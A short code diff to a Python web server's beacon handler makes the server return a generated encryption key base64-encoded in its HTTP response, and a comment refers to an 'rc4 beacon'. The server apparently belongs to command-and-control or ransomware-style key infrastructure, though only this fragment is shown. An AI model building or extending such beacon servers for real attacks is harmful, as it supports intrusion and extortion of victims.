@@ -91,8 +91,8 @@ class WebServer(object):
                                            time,
                                            encryption_key))
 
-            # returns generated encryption key in the http response
-            return encryption_key
+            # returns base64 encoded encryption key in the http response
+            return base64.b64encode(encryption_key.encode())
 
         # exception means it is an rc4 beacon instead
         except Exception as e:
